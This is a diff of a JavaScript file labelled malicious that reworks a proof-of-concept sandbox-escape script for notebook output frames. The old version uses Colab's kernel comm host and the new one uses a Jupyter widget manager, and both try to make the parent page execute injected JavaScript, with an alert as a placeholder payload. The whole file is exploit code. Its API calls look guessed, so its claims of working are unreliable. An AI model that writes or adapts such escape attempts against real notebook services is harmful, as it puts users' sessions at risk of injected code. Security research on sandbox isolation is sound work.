@@ -1,16 +1,17 @@
-// malicious.js
-console.log("Malicious script loaded");
+(function() {
+    console.log("Malicious widget script loaded.");
 
-// Attempt to access the host communication object
-const colabIframeHost = window.google?.colab?.kernel?.comm?.host;
-
-if (colabIframeHost && colabIframeHost.sendMessage) {
-    console.log("Sending exploit message to parent...");
-
-    // Exploit: Send message to parent to execute arbitrary code
-    colabIframeHost.sendMessage("execute", {
-        javascript_to_execute_in_parent: "alert('Iframe Escape Successful!');"
-    });
-} else {
-    console.log("Host object not accessible.");
-}
+    const widgetManager = window.widget_manager || null;
+    if (widgetManager) {
+        widgetManager.get_model('arbitrary-id').then(model => {
+            if (model && model.comm && model.comm.host) {
+                console.log("Accessing parent frame...");
+                model.comm.host.sendMessage('arbitrary_action', {
+                    javascript_to_execute_in_parent: 'alert("Iframe Escaped!")'
+                });
+            }
+        });
+    } else {
+        console.error("Widget manager not accessible.");
+    }
+})();
